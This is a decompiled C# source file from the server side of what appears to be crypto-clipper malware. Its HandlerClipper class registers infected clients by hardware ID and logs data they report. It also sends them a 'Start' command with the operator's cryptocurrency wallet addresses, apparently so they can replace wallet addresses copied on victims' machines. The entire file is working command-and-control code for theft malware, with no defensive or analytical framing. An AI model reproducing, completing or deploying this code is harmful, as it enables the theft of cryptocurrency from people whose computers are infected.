using System;
using System.Windows.Forms;
using Server.Connectings;
using Server.Connectings.Events;

namespace Server.Messages
{
	// Token: 0x0200003F RID: 63
	internal class HandlerClipper
	{
		// Token: 0x060001AF RID: 431 RVA: 0x0001BACC File Offset: 0x00019CCC
		public static void Read(Clients clients, object[] array)
		{
			string a = (string)array[1];
			if (!(a == "Connect"))
			{
				if (!(a == "Log"))
				{
					return;
				}
				if (Program.form.Clipper.work)
				{
					DataGridViewRow dataGridViewRow = new DataGridViewRow();
					dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
					{
						Value = clients.Hwid
					});
					dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
					{
						Value = (string)array[2]
					});
					dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
					{
						Value = (string)array[3]
					});
					Program.form.Clipper.Invoke(new MethodInvoker(delegate()
					{
						Program.form.Clipper.GridLog.Rows.Add(dataGridViewRow);
					}));
					return;
				}
				clients.Disconnect();
			}
			else
			{
				if (!Program.form.Clipper.work)
				{
					clients.Disconnect();
					return;
				}
				clients.Hwid = (string)array[2];
				clients.eventDisconnect += delegate(object s, EventDisconnect b)
				{
					Control clipper = Program.form.Clipper;
					clipper.Invoke(new MethodInvoker(delegate()
					{
						Program.form.Clipper.clients.Remove(clients);
					}));
				};
				Program.form.Clipper.Invoke(new MethodInvoker(delegate()
				{
					Program.form.Clipper.clients.Add(clients);
				}));
				if (Program.form.Clipper.materialSwitch7.Checked)
				{
					clients.Send(new object[]
					{
						"Start",
						string.Join(",", Program.form.Clipper.CryptoWallet)
					});
					return;
				}
			}
		}
	}
}
